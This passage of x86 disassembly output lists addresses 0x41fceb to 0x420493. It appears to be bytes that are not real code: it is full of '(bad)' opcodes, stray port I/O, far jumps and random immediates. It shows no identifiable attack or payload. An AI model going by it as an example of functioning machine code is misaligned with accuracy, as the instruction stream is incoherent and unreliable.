  41fceb:	imul   edx,DWORD PTR [edi+0x5fb85355],0xceb972aa
  41fcf5:	jne    0x41fc84
  41fcf7:	inc    edi
  41fcf8:	loop   0x41fce6
  41fcfa:	sbb    ebp,DWORD PTR [edi-0x18]
  41fcfd:	lds    ecx,FWORD PTR ss:[eax-0x5b62f1d9]
  41fd04:	push   cs
  41fd05:	rcr    DWORD PTR [edx],0x87
  41fd08:	dec    eax
  41fd09:	sar    BYTE PTR ss:[ecx-0x78],0x8
  41fd0e:	sbb    al,0xea
  41fd10:	mov    ebp,0x4c560dda
  41fd15:	ins    DWORD PTR es:[edi],dx
  41fd16:	inc    edx
  41fd17:	cmp    DWORD PTR [esi],ebx
  41fd19:	push   edi
  41fd1a:	or     al,0x7a
  41fd1c:	stc    
  41fd1d:	jae    0x41fceb
  41fd1f:	mov    ebp,0x4b0a4ff6
  41fd24:	sbb    al,BYTE PTR [edi]
  41fd26:	dec    ebp
  41fd27:	xchg   ecx,eax
  41fd28:	add    eax,0xbe5c3e2e
  41fd2d:	jmp    0xcd9d:0x6ef55ed7
  41fd34:	in     eax,dx
  41fd35:	pushf  
  41fd36:	dec    esi
  41fd37:	push   ebx
  41fd38:	dec    esp
  41fd39:	call   0x87558290
  41fd3e:	lahf   
  41fd3f:	or     edi,eax
  41fd41:	cdq    
  41fd42:	loopne 0x41fd4a
  41fd44:	mov    bl,0xd7
  41fd46:	and    ah,bh
  41fd48:	fldcw  WORD PTR [ebx+0x5d8b3190]
  41fd4e:	xor    al,0x2
  41fd50:	cld    
  41fd51:	sbb    BYTE PTR [ebp-0x5a858804],bl
  41fd57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd58:	mov    bh,0x2f
  41fd5a:	loop   0x41fce4
  41fd5c:	dec    edx
  41fd5d:	out    dx,eax
  41fd5e:	xchg   ecx,eax
  41fd5f:	(bad)  
  41fd60:	mov    esp,0x9cef2999
  41fd65:	retf   0xec40
  41fd68:	inc    eax
  41fd69:	shl    BYTE PTR ds:0xd1e8aed2,0x52
  41fd70:	enter  0xb485,0x52
  41fd74:	loopne 0x41fdea
  41fd76:	js     0x41fd9a
  41fd78:	aaa    
  41fd79:	jle    0x41fd3b
  41fd7b:	xchg   DWORD PTR [esi],esi
  41fd7d:	or     al,0xb4
  41fd7f:	in     al,0x50
  41fd81:	add    ah,al
  41fd83:	and    eax,DWORD PTR [edx-0x3e]
  41fd86:	(bad)  
  41fd87:	test   eax,0x6d81bd71
  41fd8c:	das    
  41fd8d:	and    dh,BYTE PTR [ecx+esi*2]
  41fd90:	js     0x41fde6
  41fd92:	and    BYTE PTR [ecx-0x5ec4a4ef],ch
  41fd98:	sbb    edx,DWORD PTR [esi+0x11010e13]
  41fd9e:	nop
  41fd9f:	popf   
  41fda0:	mov    esi,DWORD PTR [esp+esi*4]
  41fda3:	pop    ds
  41fda4:	mov    WORD PTR [ebx-0x70b23d5b],cs
  41fdaa:	jo     0x41fd8d
  41fdac:	iret   
  41fdad:	xchg   edx,eax
  41fdae:	out    0x38,eax
  41fdb0:	mov    edi,0x39253faa
  41fdb5:	sahf   
  41fdb6:	out    dx,al
  41fdb7:	fstp   DWORD PTR [edi-0x1cf225ac]
  41fdbd:	dec    ebp
  41fdbe:	and    dh,BYTE PTR [esi-0x4d1bcf2]
  41fdc4:	xchg   DWORD PTR [esi+0x20],esi
  41fdc7:	inc    edx
  41fdc8:	and    eax,edi
  41fdca:	les    edi,FWORD PTR [eax-0x39]
  41fdcd:	into   
  41fdce:	mov    DWORD PTR [ebx],edx
  41fdd0:	xor    eax,0xd13e3680
  41fdd5:	dec    edx
  41fdd6:	xchg   esi,eax
  41fdd7:	idiv   BYTE PTR [edx-0xe]
  41fdda:	inc    eax
  41fddb:	adc    edi,ecx
  41fddd:	mov    eax,DWORD PTR [eax-0x6f9a404c]
  41fde3:	cmp    DWORD PTR [ebp+0x6b45bd3b],0x44
  41fdea:	fistp  DWORD PTR [ebx-0x1d529d07]
  41fdf0:	ins    BYTE PTR es:[edi],dx
  41fdf1:	(bad)  
  41fdf2:	aaa    
  41fdf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdf4:	push   0x13043898
  41fdf9:	inc    edi
  41fdfa:	jo     0x41fded
  41fdfc:	(bad)  
  41fdfd:	jg     0x41fe0f
  41fdff:	(bad)  
  41fe00:	fadd   DWORD PTR [esi+0x51a3969f]
  41fe06:	je     0x41fded
  41fe08:	stos   BYTE PTR es:[edi],al
  41fe09:	mov    ds:0xcf529cb6,eax
  41fe0e:	inc    ecx
  41fe0f:	mov    esi,0xfe2764e8
  41fe14:	ror    DWORD PTR [eax-0x7e116bbe],1
  41fe1a:	aam    0x21
  41fe1c:	lods   al,BYTE PTR ds:[esi]
  41fe1d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe1f:	hlt    
  41fe20:	enter  0x353e,0xbb
  41fe24:	cmp    eax,0x3fcce446
  41fe29:	cwde   
  41fe2a:	dec    edx
  41fe2b:	jge    0x41fe47
  41fe2d:	test   dl,bh
  41fe2f:	rcl    esi,cl
  41fe31:	adc    edx,DWORD PTR [ebx+0x1880bc9c]
  41fe37:	mov    ch,0x42
  41fe39:	dec    edi
  41fe3a:	jge    0x41fe4e
  41fe3c:	mov    esp,0x97b29375
  41fe41:	pop    edx
  41fe42:	lahf   
  41fe43:	jle    0x41fe97
  41fe45:	enter  0x2ea3,0xa3
  41fe49:	sahf   
  41fe4a:	dec    eax
  41fe4b:	jecxz  0x41feb5
  41fe4d:	mov    al,ds:0xbef6ff75
  41fe52:	fild   WORD PTR [ebp-0x3a]
  41fe55:	call   FWORD PTR ds:0x8ad03b80
  41fe5b:	pop    ds
  41fe5c:	mov    al,0x38
  41fe5e:	mov    DWORD PTR [edi],eax
  41fe60:	fisttp QWORD PTR [eax+0xc]
  41fe63:	mov    eax,0x6e9d6765
  41fe68:	sub    eax,0x6448da27
  41fe6d:	pop    esp
  41fe6e:	sbb    al,0x1b
  41fe70:	lock adc esi,ecx
  41fe73:	test   BYTE PTR [eax],0x40
  41fe76:	pop    ss
  41fe77:	jmp    0x41fe5d
  41fe79:	in     al,dx
  41fe7a:	inc    al
  41fe7c:	push   cs
  41fe7d:	add    DWORD PTR [esi+ecx*1],0xeec4be56
  41fe84:	jb     0x41fecd
  41fe86:	mov    ah,0xbc
  41fe88:	fsub   QWORD PTR [esi+ebp*2]
  41fe8b:	add    cl,dl
  41fe8d:	adc    eax,0x5c28b04f
  41fe92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe93:	aas    
  41fe94:	fldcw  WORD PTR [si-0x42]
  41fe98:	push   bx
  41fe9a:	inc    ebp
  41fe9b:	inc    ebx
  41fe9c:	push   eax
  41fe9d:	popf   
  41fe9e:	sbb    cl,BYTE PTR [ecx+0x55da8e46]
  41fea4:	je     0x41ff0e
  41fea6:	ret    
  41fea7:	cs daa 
  41fea9:	jle    0x41fe97
  41feab:	sar    DWORD PTR [esi-0x34],cl
  41feae:	inc    ebx
  41feaf:	and    BYTE PTR [edi+eiz*2+0x17],dl
  41feb3:	shl    BYTE PTR [esi-0x2d],cl
  41feb6:	push   ds
  41feb7:	jmpw   0x430e
  41febb:	int    0x66
  41febd:	and    esi,0x1a
  41fec0:	inc    eax
  41fec1:	fsubr  QWORD PTR [ebp-0x69916e35]
  41fec7:	dec    ebx
  41fec8:	sti    
  41fec9:	daa    
  41feca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fecb:	cmp    eax,DWORD PTR ds:0xe45ec876
  41fed1:	gs xchg edi,eax
  41fed3:	or     eax,DWORD PTR [bx+0x1]
  41fed7:	test   al,0x9d
  41fed9:	sahf   
  41feda:	out    0x53,eax
  41fedc:	sub    al,0xc4
  41fede:	in     al,dx
  41fedf:	outs   dx,BYTE PTR ds:[esi]
  41fee0:	push   ss
  41fee1:	arpl   WORD PTR [ecx+eiz*8],cx
  41fee4:	(bad)  
  41fee5:	dec    eax
  41fee6:	mov    esp,DWORD PTR [ebp+0x2f]
  41fee9:	push   0xca12c06f
  41feee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feef:	out    dx,eax
  41fef0:	or     BYTE PTR [edi],al
  41fef2:	mov    ch,0xea
  41fef4:	and    al,0xa0
  41fef6:	sbb    bl,BYTE PTR [edi]
  41fef8:	rol    dh,0xcc
  41fefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fefc:	inc    ecx
  41fefd:	pop    ebp
  41fefe:	cld    
  41feff:	mov    al,0xc9
  41ff01:	neg    edi
  41ff03:	xchg   ebp,eax
  41ff04:	out    dx,al
  41ff05:	fwait
  41ff06:	xor    al,0x8a
  41ff08:	popf   
  41ff09:	(bad)  
  41ff0a:	outs   dx,DWORD PTR ds:[esi]
  41ff0b:	and    edi,DWORD PTR [ebp-0x62dad581]
  41ff11:	or     esi,DWORD PTR [ebp-0x7e8f5651]
  41ff17:	cld    
  41ff18:	loopne 0x41ff19
  41ff1a:	idiv   edi
  41ff1c:	jb     0x41fee7
  41ff1e:	lahf   
  41ff1f:	rcl    BYTE PTR [esp+ebx*8+0x13],1
  41ff23:	mov    ebx,0xfb01a2c0
  41ff28:	std    
  41ff29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff2a:	xor    BYTE PTR [ecx+esi*2-0x26f367cd],cl
  41ff31:	daa    
  41ff32:	mov    edi,DWORD PTR [edx+0x7933efb0]
  41ff38:	pop    ds
  41ff39:	scas   eax,DWORD PTR es:[edi]
  41ff3a:	gs cmp al,0xd5
  41ff3d:	pop    ecx
  41ff3e:	add    ebp,esi
  41ff40:	pop    ecx
  41ff41:	outs   dx,BYTE PTR ds:[esi]
  41ff42:	shr    BYTE PTR [edx],1
  41ff44:	mov    eax,0x106c4c15
  41ff49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4a:	xchg   esi,eax
  41ff4b:	mov    eax,ds:0x4c1f08a
  41ff50:	cld    
  41ff51:	mov    WORD PTR [ebx+0x70],es
  41ff54:	pop    ds
  41ff55:	cmp    al,0xf9
  41ff57:	mov    bh,0x12
  41ff59:	sbb    eax,DWORD PTR [esp+edi*4]
  41ff5c:	shl    BYTE PTR [edx],cl
  41ff5e:	xchg   esi,eax
  41ff5f:	mov    ah,0x5
  41ff61:	push   eax
  41ff62:	sbb    al,BYTE PTR ds:0x52006b46
  41ff68:	mov    esp,fs
  41ff6a:	(bad)  
  41ff6b:	cmp    ch,BYTE PTR [edx+0x6c3f3709]
  41ff71:	ja     0x41ff0c
  41ff73:	mov    ebx,0xc3068ef0
  41ff78:	sbb    bh,BYTE PTR [edi]
  41ff7a:	lock xchg ebp,eax
  41ff7c:	jno    0x41ff2d
  41ff7e:	and    bh,ch
  41ff80:	(bad)  
  41ff81:	mov    esi,0x64be008f
  41ff86:	xchg   edi,eax
  41ff87:	gs push eax
  41ff89:	xchg   esp,eax
  41ff8a:	xchg   ecx,eax
  41ff8b:	sub    al,0x46
  41ff8d:	adc    ch,cl
  41ff8f:	mov    ecx,0xfce5f10
  41ff94:	std    
  41ff95:	aaa    
  41ff96:	mov    esp,0x3bd68361
  41ff9b:	and    al,0xfb
  41ff9d:	stc    
  41ff9e:	jp     0x41ff4a
  41ffa0:	mov    WORD PTR [edx+0x29c3da10],?
  41ffa6:	jae    0x41ff47
  41ffa8:	test   BYTE PTR [esi+0x69cb7994],0xab
  41ffaf:	mov    edx,0x95d15641
  41ffb4:	popf   
  41ffb5:	clc    
  41ffb6:	mov    esp,0xb533d46c
  41ffbb:	neg    DWORD PTR [edx-0xee3ce47]
  41ffc1:	inc    esi
  41ffc2:	jecxz  0x41ffa9
  41ffc4:	jnp    0x42003f
  41ffc6:	adc    eax,0x6a773b41
  41ffcb:	xchg   ebx,eax
  41ffcc:	mov    al,BYTE PTR [ebp-0x4d]
  41ffcf:	and    bl,al
  41ffd1:	or     al,0xcb
  41ffd3:	jle    0x420047
  41ffd5:	jle    0x41ff87
  41ffd7:	jp     0x420039
  41ffd9:	dec    esp
  41ffda:	push   esp
  41ffdb:	jnp    0x42005a
  41ffdd:	mov    dl,0x33
  41ffdf:	dec    ebx
  41ffe0:	jo     0x42001f
  41ffe2:	stc    
  41ffe3:	(bad)  
  41ffe4:	jmp    0x11b6:0xa8232127
  41ffeb:	stos   BYTE PTR es:[edi],al
  41ffec:	mov    dh,0x85
  41ffee:	ffree  st(2)
  41fff0:	mov    es,WORD PTR [esi]
  41fff2:	add    BYTE PTR [edi],cl
  41fff4:	into   
  41fff5:	pop    eax
  41fff6:	jge    0x41ff83
  41fff8:	xchg   edi,eax
  41fff9:	xor    DWORD PTR [eax+0x4c],ebp
  41fffc:	out    dx,al
  41fffd:	retf   0xc08a
  420000:	sbb    eax,0x4d2b1296
  420005:	(bad)  
  420006:	jns    0x42006d
  420008:	dec    eax
  420009:	rol    edx,0x2
  42000c:	cmc    
  42000d:	cli    
  42000e:	lods   al,BYTE PTR ds:[esi]
  42000f:	mov    BYTE PTR [ebx],bl
  420011:	jnp    0x420077
  420013:	xchg   edi,eax
  420014:	fdiv   QWORD PTR [eax+eiz*2]
  420017:	pushf  
  420018:	mov    ?,WORD PTR ds:0x57163c53
  42001e:	std    
  42001f:	fld    TBYTE PTR [eax+0x2d]
  420022:	mov    ebp,0x7a3927b2
  420027:	(bad)  
  420028:	call   0xd1c2:0x590e1817
  42002f:	dec    esp
  420030:	call   0xb3b2958b
  420035:	xor    eax,0x1365512b
  42003a:	out    dx,al
  42003b:	out    dx,al
  42003c:	(bad)  
  42003d:	cwde   
  42003e:	call   0x7a2f:0x1856587d
  420045:	fst    DWORD PTR [eax]
  420047:	fs stos DWORD PTR es:[edi],eax
  420049:	mov    bh,dh
  42004b:	test   eax,0xd0d2bb9d
  420050:	or     eax,0xa7f974d4
  420055:	int3   
  420056:	mov    bl,0x44
  420058:	loop   0x41fff9
  42005a:	call   0xd22d786b
  42005f:	fmul   QWORD PTR [eax+0x62]
  420062:	adc    dl,BYTE PTR [ebx]
  420064:	jp     0x4200cc
  420066:	loop   0x420074
  420068:	pop    ebp
  420069:	sbb    esi,DWORD PTR [ebp+0x1dde7ca7]
  42006f:	adc    DWORD PTR [ecx+edx*2],ebx
  420072:	clc    
  420073:	call   0xf95c94de
  420078:	adc    ch,al
  42007a:	xchg   ebx,eax
  42007b:	loope  0x420069
  42007d:	lods   eax,DWORD PTR ds:[esi]
  42007e:	sbb    al,BYTE PTR [edx+ebx*2-0x4cbb0464]
  420085:	test   al,0xde
  420087:	and    ecx,DWORD PTR [edi]
  420089:	out    0x55,al
  42008b:	dec    eax
  42008c:	mov    edx,0x9fd8b9ad
  420091:	cdq    
  420092:	add    eax,0xf81a1bb
  420097:	jae    0x420110
  420099:	iret   
  42009a:	into   
  42009b:	mov    DWORD PTR [edi+0x43f35b],ecx
  4200a1:	pop    edi
  4200a2:	stos   DWORD PTR es:[edi],eax
  4200a3:	fsubp  st(1),st
  4200a5:	xchg   esi,eax
  4200a6:	xchg   esp,eax
  4200a7:	sbb    edx,edi
  4200a9:	aas    
  4200aa:	dec    ebp
  4200ab:	xchg   edx,eax
  4200ac:	(bad)  
  4200ad:	(bad)  
  4200ae:	inc    ebx
  4200af:	push   esi
  4200b0:	test   al,0xb
  4200b2:	fidiv  WORD PTR [eax-0x60c8913c]
  4200b8:	out    dx,al
  4200b9:	mov    ch,0x34
  4200bb:	test   DWORD PTR [edx-0x1e],eax
  4200be:	aam    0xf5
  4200c0:	mov    bh,0x5f
  4200c2:	adc    DWORD PTR [eax+0x24a3c63c],ebx
  4200c8:	mov    ?,WORD PTR [di-0x5e57]
  4200cd:	jmp    0x42010d
  4200cf:	adc    ch,BYTE PTR [ecx-0x2]
  4200d2:	cmp    BYTE PTR [edx+0x11],al
  4200d5:	ins    DWORD PTR es:[edi],dx
  4200d6:	and    eax,0x657e0f4
  4200db:	or     eax,0xf1f9122
  4200e0:	and    al,0x80
  4200e2:	es push esp
  4200e4:	mov    edx,0x9f6b785c
  4200e9:	ja     0x42011e
  4200eb:	mov    ds:0x624e10b4,eax
  4200f0:	inc    esi
  4200f1:	adc    BYTE PTR [esi-0x67],bl
  4200f4:	mov    ds:0x5e9e39fe,eax
  4200f9:	push   0xed0e3bed
  4200fe:	and    edi,edx
  420100:	sbb    dl,BYTE PTR [ebx+0x77]
  420103:	fcom   DWORD PTR [esi-0x70]
  420106:	pop    edi
  420107:	loope  0x420120
  420109:	ja     0x4200c9
  42010b:	loopne 0x420171
  42010d:	fs in  al,dx
  42010f:	dec    edi
  420110:	mov    ch,0xce
  420112:	rcr    DWORD PTR [ecx+0x6c],1
  420115:	vpor   xmm5,xmm1,XMMWORD PTR [ebx]
  420119:	mov    dh,0x1
  42011b:	mov    esi,0x6b7c39c2
  420120:	retf   
  420121:	pushf  
  420122:	dec    ecx
  420123:	stos   DWORD PTR es:[edi],eax
  420124:	dec    esi
  420125:	sbb    ebx,DWORD PTR [eax-0x43af9397]
  42012b:	cmc    
  42012c:	div    DWORD PTR [esi-0x3c]
  42012f:	xlat   BYTE PTR ds:[ebx]
  420130:	mov    al,0xaf
  420132:	cmp    dl,BYTE PTR [edi+0x1368fc1c]
  420138:	sbb    eax,DWORD PTR [edx+0x13ab8fc4]
  42013e:	push   eax
  42013f:	cld    
  420140:	icebp  
  420141:	or     eax,DWORD PTR [eax]
  420143:	xchg   ebx,eax
  420144:	dec    esi
  420145:	retf   
  420146:	dec    esi
  420147:	fs in  eax,dx
  420149:	push   ds
  42014a:	out    dx,al
  42014b:	mov    esp,0x58657387
  420150:	push   esp
  420151:	or     eax,0x97ece8c
  420156:	(bad)  
  420157:	or     eax,0xab28fa63
  42015c:	pop    ss
  42015d:	pop    ecx
  42015e:	pop    ecx
  42015f:	push   edx
  420160:	mov    ch,0xc8
  420162:	sub    cl,ch
  420164:	pusha  
  420165:	lods   al,BYTE PTR ds:[esi]
  420166:	sbb    eax,0x72ed80b0
  42016b:	push   ecx
  42016c:	mov    al,0x9a
  42016e:	and    cl,BYTE PTR [edx]
  420170:	loopne 0x420194
  420172:	mov    ds:0xb7bc3081,eax
  420177:	sbb    BYTE PTR [ecx+0x1e],al
  42017a:	mov    edi,0x410ae58c
  42017f:	call   0x713d:0x44532008
  420186:	in     al,0x25
  420188:	pop    esi
  420189:	xor    eax,0x6a3cc4ad
  42018e:	cmp    bh,BYTE PTR [edx+0x46]
  420191:	push   esi
  420192:	aam    0xec
  420194:	sub    al,0x7b
  420196:	call   0x4e0df42a
  42019b:	jno    0x42015f
  42019d:	lock dec ebp
  42019f:	jl     0x4201fe
  4201a1:	lods   eax,DWORD PTR ds:[esi]
  4201a2:	(bad)  
  4201a3:	aaa    
  4201a4:	aam    0xde
  4201a6:	inc    eax
  4201a7:	cmp    cl,BYTE PTR [esi-0x11]
  4201aa:	push   edi
  4201ab:	pop    ds
  4201ac:	add    al,0xdc
  4201ae:	and    bl,al
  4201b0:	lahf   
  4201b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201b2:	lods   eax,DWORD PTR ds:[esi]
  4201b3:	inc    edx
  4201b4:	es push eax
  4201b6:	nop
  4201b7:	out    dx,eax
  4201b8:	aam    0x1
  4201ba:	sbb    ch,bh
  4201bc:	mov    eax,0x5abde88
  4201c1:	add    eax,0x7b845015
  4201c6:	(bad)  
  4201c7:	and    eax,0xbda44826
  4201cc:	rep lods eax,DWORD PTR ds:[esi]
  4201ce:	and    esi,DWORD PTR [eax]
  4201d0:	repnz in al,0x44
  4201d3:	sbb    ebx,0x73b828cc
  4201d9:	lods   eax,DWORD PTR ds:[esi]
  4201da:	test   esi,esi
  4201dc:	mov    dl,0x57
  4201de:	xor    bh,BYTE PTR [ebx]
  4201e0:	xchg   ecx,eax
  4201e1:	mov    bl,ch
  4201e3:	mov    ah,0x8c
  4201e5:	pop    es
  4201e6:	dec    edi
  4201e7:	inc    esp
  4201e8:	fwait
  4201e9:	xchg   ebx,eax
  4201ea:	dec    ecx
  4201eb:	xlat   BYTE PTR ds:[ebx]
  4201ec:	aad    0x95
  4201ee:	xor    cl,0x61
  4201f1:	jmp    0x42019a
  4201f3:	popf   
  4201f4:	xor    eax,0x4b263319
  4201f9:	ins    BYTE PTR es:[edi],dx
  4201fa:	into   
  4201fb:	jnp    0x4201c4
  4201fd:	sbb    ch,BYTE PTR [edx+0x10fd0680]
  420203:	xlat   BYTE PTR ds:[ebx]
  420204:	add    eax,0x733b872f
  420209:	cmp    BYTE PTR [eax+0x7fab3de],0x65
  420210:	ins    BYTE PTR es:[edi],dx
  420211:	push   esp
  420212:	fs jae 0x4201ed
  420215:	mov    ebp,0x82c5ba1c
  42021a:	cmp    BYTE PTR [ecx-0x407c54b5],0xae
  420221:	mov    ds:0xbd812021,al
  420226:	mov    cl,0xc5
  420228:	sahf   
  420229:	hlt    
  42022a:	mov    ch,0x44
  42022c:	popf   
  42022d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42022e:	lds    edx,FWORD PTR [edi-0x60]
  420231:	(bad)  
  420233:	ins    DWORD PTR es:[edi],dx
  420234:	sub    BYTE PTR [esi],ch
  420236:	mov    ecx,0x18dbff37
  42023b:	and    esp,0xfffffff8
  42023e:	call   0x222:0x4df9cbdb
  420245:	or     BYTE PTR [edi],al
  420247:	pop    ds
  420248:	std    
  420249:	repz out 0x19,eax
  42024c:	rol    DWORD PTR [ebp+0x685f630d],1
  420252:	jmp    0x4201e5
  420254:	and    ch,bh
  420256:	and    ebp,DWORD PTR [ebp+0x4b]
  420259:	enter  0xe47a,0x54
  42025d:	xor    BYTE PTR [edi-0x4d],bl
  420260:	mov    dl,0x62
  420262:	fs sahf 
  420264:	in     al,dx
  420265:	fld    QWORD PTR [ecx-0x64b63827]
  42026b:	into   
  42026c:	rcl    BYTE PTR [edx],0x78
  42026f:	sti    
  420270:	lock cmp BYTE PTR [eax],ch
  420273:	arpl   WORD PTR [edi-0x6e],cx
  420276:	fsubp  st(4),st
  420278:	add    eax,edi
  42027a:	outs   dx,DWORD PTR ds:[esi]
  42027b:	shl    DWORD PTR [esi],1
  42027d:	mov    al,ds:0x6071d191
  420282:	les    eax,FWORD PTR [ebx+0x71d35ad1]
  420288:	or     cl,BYTE PTR [edx+ecx*2-0x202210d3]
  42028f:	mov    esi,DWORD PTR [eax]
  420291:	iret   
  420292:	hlt    
  420293:	inc    ebx
  420294:	dec    edx
  420295:	test   DWORD PTR [esi-0x77],esp
  420298:	cmp    al,0x7
  42029a:	cdq    
  42029b:	fadd   DWORD PTR [esp+ecx*2-0x11]
  42029f:	pop    esi
  4202a0:	pop    es
  4202a1:	cmp    dh,bh
  4202a3:	out    0x39,al
  4202a5:	dec    edx
  4202a6:	or     eax,0x4a45ee1a
  4202ab:	nop
  4202ac:	pushf  
  4202ad:	push   esp
  4202ae:	or     bl,BYTE PTR [edi]
  4202b0:	mov    edx,0xde79edb5
  4202b5:	dec    esp
  4202b6:	adc    edx,DWORD PTR [eax+eax*8]
  4202b9:	mov    ebp,0xc0bd8a42
  4202be:	sahf   
  4202bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202c0:	xor    eax,DWORD PTR [edi+0x6cc7d156]
  4202c6:	loop   0x420293
  4202c8:	pop    ss
  4202c9:	(bad)  
  4202ca:	shl    BYTE PTR [esi-0x45],1
  4202cd:	jge    0x4202b9
  4202cf:	sbb    esp,0x61305cfb
  4202d5:	push   0x4d
  4202d7:	test   BYTE PTR [ebp-0x40],dl
  4202da:	lds    ebp,FWORD PTR [ecx+0x19]
  4202dd:	lahf   
  4202de:	mov    edx,0x300a2213
  4202e3:	dec    edi
  4202e4:	daa    
  4202e5:	(bad)  
  4202e6:	cmp    eax,0x2daf9647
  4202eb:	jp     0x4202b2
  4202ed:	xchg   esp,eax
  4202ee:	xor    DWORD PTR ss:[ecx+eax*4],eax
  4202f2:	test   al,0x22
  4202f4:	jmp    0x420284
  4202f6:	or     eax,0x460d3816
  4202fb:	push   ecx
  4202fc:	call   0x49fd:0x9e009147
  420303:	or     BYTE PTR [edi-0x5d],cl
  420306:	test   al,0xcf
  420308:	pop    es
  420309:	icebp  
  42030a:	jae    0x4202e6
  42030c:	and    ebx,ebx
  42030e:	mov    al,0x29
  420310:	mov    bh,0x16
  420312:	ins    BYTE PTR es:[edi],dx
  420313:	mov    gs,WORD PTR [ebp-0x9]
  420316:	aas    
  420317:	mov    ch,0xba
  420319:	xchg   edi,eax
  42031a:	xchg   esi,eax
  42031b:	sub    al,0xc4
  42031d:	inc    ebx
  42031e:	es popf 
  420320:	ret    0x1240
  420323:	xor    ebp,esp
  420325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420326:	add    ebp,DWORD PTR [edx]
  420328:	ret    0xb806
  42032b:	sub    BYTE PTR [edx-0x4e4dce53],0x7c
  420332:	pop    ss
  420333:	(bad)
  420336:	ret    
  420337:	and    edi,DWORD PTR [edx+0x1]
  42033a:	ror    ch,cl
  42033c:	loope  0x420377
  42033e:	inc    ebx
  42033f:	cmp    al,cl
  420341:	dec    ecx
  420342:	xor    eax,0x213b7fe5
  420347:	fst    st(2)
  420349:	mov    eax,ds:0xd2a279a2
  42034e:	jo     0x42032b
  420350:	pop    eax
  420351:	outs   dx,BYTE PTR ds:[esi]
  420352:	in     al,0x70
  420354:	add    eax,0xd404aeda
  420359:	push   ss
  42035a:	idiv   BYTE PTR [edx-0x72]
  42035d:	(bad)  
  42035e:	ins    BYTE PTR es:[edi],dx
  42035f:	dec    edi
  420360:	sbb    BYTE PTR [ebx-0x163e0cf6],0x8f
  420367:	sbb    ebp,DWORD PTR [ebp+eax*8+0x319db5ff]
  42036e:	(bad)  
  42036f:	xor    BYTE PTR [edx],cl
  420371:	frstor [esi-0x6b3be825]
  420377:	(bad)  
  420378:	daa    
  420379:	pop    es
  42037a:	or     ah,ch
  42037c:	cmp    edx,esi
  42037e:	hlt    
  42037f:	adc    dl,BYTE PTR [ebx+0xd]
  420382:	mov    ebx,0xb66d19e7
  420387:	and    esp,esp
  420389:	jmp    0x41417daa
  42038e:	stos   BYTE PTR es:[edi],al
  42038f:	jge    0x420379
  420391:	mov    dl,0x20
  420393:	in     al,dx
  420394:	add    esp,DWORD PTR [ebp+0x506f14a1]
  42039a:	scas   eax,DWORD PTR es:[edi]
  42039b:	dec    esi
  42039c:	push   ecx
  42039d:	add    ebx,DWORD PTR [esi+0x7e101147]
  4203a3:	sub    eax,0xfaa236
  4203a8:	fcomi  st,st(5)
  4203aa:	push   0x873914e1
  4203af:	mov    ds:0xc6fa66f0,al
  4203b4:	into   
  4203b5:	pusha  
  4203b6:	sti    
  4203b7:	repz inc edx
  4203b9:	mov    bl,0xc
  4203bb:	mov    ch,0x3e
  4203bd:	ret    0xc3b2
  4203c0:	push   esi
  4203c1:	sbb    BYTE PTR [ecx],dl
  4203c3:	std    
  4203c4:	fisttp DWORD PTR [esi-0x10]
  4203c7:	out    dx,eax
  4203c8:	int    0xd8
  4203ca:	add    eax,0xedbaceeb
  4203cf:	icebp  
  4203d0:	lds    ecx,FWORD PTR [edx+0x3d321c26]
  4203d6:	dec    eax
  4203d7:	cmp    eax,0xbb7188e0
  4203dc:	sbb    BYTE PTR [eax],ah
  4203de:	xor    eax,ebp
  4203e0:	fistp  QWORD PTR [ebx+0x5b35d751]
  4203e6:	sbb    dl,BYTE PTR [edx+edi*4+0x492296e7]
  4203ed:	stos   DWORD PTR es:[edi],eax
  4203ee:	outs   dx,BYTE PTR ds:[esi]
  4203ef:	fld    TBYTE PTR [eax]
  4203f1:	sbb    eax,0x5b5a1780
  4203f6:	int    0x25
  4203f8:	cdq    
  4203f9:	lods   eax,DWORD PTR ds:[esi]
  4203fa:	push   ecx
  4203fb:	xchg   ah,cl
  4203fd:	add    al,0xc6
  4203ff:	fsub   QWORD PTR [ebx-0x2ee359e2]
  420405:	retf   
  420406:	mov    esp,0xc82c2ca2
  42040b:	sub    eax,0x2fac6d39
  420410:	and    BYTE PTR [ebp+0x2a],0x76
  420414:	cdq    
  420415:	test   DWORD PTR ds:0xc26bb352,ebp
  42041b:	mov    esp,0x7336fc2f
  420420:	jl     0x4203ff
  420422:	mov    ecx,0x6f5f0437
  420427:	and    edi,esp
  420429:	aas    
  42042a:	xchg   esi,eax
  42042b:	enter  0x70d6,0x51
  42042f:	idiv   edi
  420431:	push   edi
  420432:	xchg   edi,eax
  420433:	inc    esp
  420434:	std    
  420435:	xchg   ebp,eax
  420436:	mov    al,BYTE PTR [esi-0x280337d6]
  42043c:	sbb    al,0xd5
  42043e:	xchg   esi,eax
  42043f:	or     al,0x46
  420441:	sbb    eax,0x8b8fc693
  420447:	xor    BYTE PTR [eax],0x7d
  42044a:	adc    al,0xf4
  42044c:	daa    
  42044d:	mov    eax,0xfbfa304c
  420452:	add    eax,0xf64ea265
  420457:	push   ebx
  420458:	sete   BYTE PTR [edx+edx*1-0x27813326]
  420460:	cmp    eax,0x381b84f2
  420465:	pop    edi
  420466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420467:	dec    ecx
  420468:	scas   eax,DWORD PTR es:[edi]
  420469:	ja     0x420466
  42046b:	mov    bh,BYTE PTR [ebp-0x55]
  42046e:	sub    ecx,0x6db7d57b
  420474:	push   es
  420475:	ret    0x6646
  420478:	xchg   esi,eax
  420479:	ret    
  42047a:	sub    eax,0x84c77cc1
  42047f:	cmp    BYTE PTR [edx+0x52584707],ah
  420485:	push   esp
  420486:	jl     0x420499
  420488:	pop    eax
  420489:	mov    esi,0x681e6d23
  42048e:	mov    ebp,0x9b994716
  420493:	(bad)  
